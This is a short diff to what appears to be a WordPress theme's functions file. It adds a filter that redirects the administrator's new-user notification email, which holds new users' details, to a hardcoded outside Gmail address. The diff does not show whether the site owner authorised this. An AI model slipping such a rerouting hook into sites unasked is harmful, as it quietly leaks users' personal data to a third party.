@@ -366,6 +366,12 @@ function get_page_url($template_name) {
 }
 
 
+add_filter( 'wp_new_user_notification_email_admin', 'my_wp_new_user_notification_email_admin', 10, 3 );
+function my_wp_new_user_notification_email_admin( $notification, $user, $blogname ) {
+    $notification['to'] = 'time2top10@gmail.com';
+    return $notification;
+}
+
 //GET PARENT TERM INFO
 function get_parent_term_title($parent_term_id, $parent_term_name) {
   $parent_city_terms = get_ancestors( $parent_term_id, $parent_term_name );
